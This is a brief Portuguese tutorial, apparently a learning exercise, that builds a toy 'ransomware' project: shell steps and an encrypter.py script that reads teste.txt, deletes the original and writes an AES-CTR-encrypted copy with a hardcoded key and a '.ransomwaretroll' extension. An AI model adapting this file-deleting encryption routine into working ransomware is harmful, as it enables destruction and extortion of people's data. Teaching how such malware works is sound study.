## Criar pasta do projeto

mkdir projeto-ransomware

## Entrar na pasta

cd projeto-ransomware

## Criar tres arquivos

touch teste.txt

touch encrypter.py

touch decrypter.py

## Criar os dados dentro de cada arquivo

nano encrypter.py

import os
import pyaes

## abrir o arquivo a ser criptografado
## criar uma variavel
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo original
os.remove(file_name)

## definir a chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
## ctrl+o (para escrever) / ctrl+x (para sair)
